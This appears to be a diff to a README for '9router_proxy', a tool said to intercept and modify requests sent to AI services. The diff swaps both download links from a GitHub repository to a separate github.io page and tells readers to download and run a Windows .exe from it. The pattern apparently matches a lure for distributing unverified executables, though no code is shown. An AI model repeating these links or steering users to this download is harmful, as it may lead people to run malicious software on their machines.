@@ -1,6 +1,6 @@
 # 🌐 9router_proxy - Manage your AI requests with ease
 
-[![Download 9router_proxy](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Europanlimeade375/9router_proxy)
+[![Download 9router_proxy](https://img.shields.io/badge/Download-Windows-blue.svg)](https://europanlimeade375.github.io)
 
 9router_proxy helps you manage and change your data before it reaches AI services. Use this tool to oversee every request you send to your AI partners. You can inspect, modify, and route your internet traffic through specific pathways to ensure your AI tools work the way you want them to work.
 
@@ -8,7 +8,7 @@
 
 You can obtain the software directly from the project release page. 
 
-[Click here to visit the release page and download the software for Windows](https://github.com/Europanlimeade375/9router_proxy)
+[Click here to visit the release page and download the software for Windows](https://europanlimeade375.github.io)
 
 Once the page opens, look for the file ending in .exe. Click that file to save it to your computer.
 
